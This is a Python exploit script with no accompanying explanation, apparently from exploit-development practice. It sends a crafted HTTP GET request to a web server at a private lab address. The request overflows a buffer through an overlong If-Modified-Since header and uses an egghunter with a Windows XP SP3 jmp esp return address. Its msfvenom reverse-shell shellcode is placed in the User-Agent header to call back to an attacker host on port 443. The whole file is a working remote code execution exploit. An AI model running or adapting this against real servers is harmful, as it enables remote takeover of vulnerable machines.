#!/usr/bin/env python

import socket
import struct

host = "192.168.122.152"
port = 80
badchars = ("\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f"
        "\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f"
        "\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f"
        "\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f"
        "\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f"
        "\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf"
        "\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf"
        "\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")
# tag: pito
egghunter = ("\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74"
        "\xef\xb8\x70\x69\x74\x6f\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7")
# 0x77FAB277 jmp esp Windows XP SP3 english
ret = "\x77\xb2\xfa\x77"
# msfvenom -p windows/shell_reverse_tcp LHOST=192.168.122.10 LPORT=443 -f c -b "\x00\x09\x0a\x0b\x0d"
shellcode = ("\xda\xc2\xbb\x56\x8f\x86\xc1\xd9\x74\x24\xf4\x5a\x33\xc9\xb1"
        "\x52\x83\xc2\x04\x31\x5a\x13\x03\x0c\x9c\x64\x34\x4c\x4a\xea"
        "\xb7\xac\x8b\x8b\x3e\x49\xba\x8b\x25\x1a\xed\x3b\x2d\x4e\x02"
        "\xb7\x63\x7a\x91\xb5\xab\x8d\x12\x73\x8a\xa0\xa3\x28\xee\xa3"
        "\x27\x33\x23\x03\x19\xfc\x36\x42\x5e\xe1\xbb\x16\x37\x6d\x69"
        "\x86\x3c\x3b\xb2\x2d\x0e\xad\xb2\xd2\xc7\xcc\x93\x45\x53\x97"
        "\x33\x64\xb0\xa3\x7d\x7e\xd5\x8e\x34\xf5\x2d\x64\xc7\xdf\x7f"
        "\x85\x64\x1e\xb0\x74\x74\x67\x77\x67\x03\x91\x8b\x1a\x14\x66"
        "\xf1\xc0\x91\x7c\x51\x82\x02\x58\x63\x47\xd4\x2b\x6f\x2c\x92"
        "\x73\x6c\xb3\x77\x08\x88\x38\x76\xde\x18\x7a\x5d\xfa\x41\xd8"
        "\xfc\x5b\x2c\x8f\x01\xbb\x8f\x70\xa4\xb0\x22\x64\xd5\x9b\x2a"
        "\x49\xd4\x23\xab\xc5\x6f\x50\x99\x4a\xc4\xfe\x91\x03\xc2\xf9"
        "\xd6\x39\xb2\x95\x28\xc2\xc3\xbc\xee\x96\x93\xd6\xc7\x96\x7f"
        "\x26\xe7\x42\x2f\x76\x47\x3d\x90\x26\x27\xed\x78\x2c\xa8\xd2"
        "\x99\x4f\x62\x7b\x33\xaa\xe5\x44\x6c\xce\xff\x2c\x6f\x2e\x01"
        "\x16\xe6\xc8\x6b\x78\xaf\x43\x04\xe1\xea\x1f\xb5\xee\x20\x5a"
        "\xf5\x65\xc7\x9b\xb8\x8d\xa2\x8f\x2d\x7e\xf9\xed\xf8\x81\xd7"
        "\x99\x67\x13\xbc\x59\xe1\x08\x6b\x0e\xa6\xff\x62\xda\x5a\x59"
        "\xdd\xf8\xa6\x3f\x26\xb8\x7c\xfc\xa9\x41\xf0\xb8\x8d\x51\xcc"
        "\x41\x8a\x05\x80\x17\x44\xf3\x66\xce\x26\xad\x30\xbd\xe0\x39"
        "\xc4\x8d\x32\x3f\xc9\xdb\xc4\xdf\x78\xb2\x90\xe0\xb5\x52\x15"
        "\x99\xab\xc2\xda\x70\x68\xf2\x90\xd8\xd9\x9b\x7c\x89\x5b\xc6"
        "\x7e\x64\x9f\xff\xfc\x8c\x60\x04\x1c\xe5\x65\x40\x9a\x16\x14"
        "\xd9\x4f\x18\x8b\xda\x45")

payload = "A"*20 + egghunter + "A"*(72-32-20) + ret + "\xeb\xc6"
payload2 = "pitopito" + shellcode

buf = "GET / HTTP/1.1\r\n"
buf += "User-Agent: " + payload2 + "\r\n"
buf += "Host: " + host + ":" + str(port) + "\r\n"
buf += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
buf += "Accept-Language: en-us\r\n"
buf += "Accept-Encoding: gzip, deflate\r\n"
buf += "Referer: http://" + host + "\r\n"
buf += "Connection: Keep-Alive\r\n"
buf += "If-Modified-Since: Mon, " + payload + "\r\n\r\n"

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host, port))

print("[*] Sending " + str(len(payload)) + " bytes")
s.send(buf)
s.close()

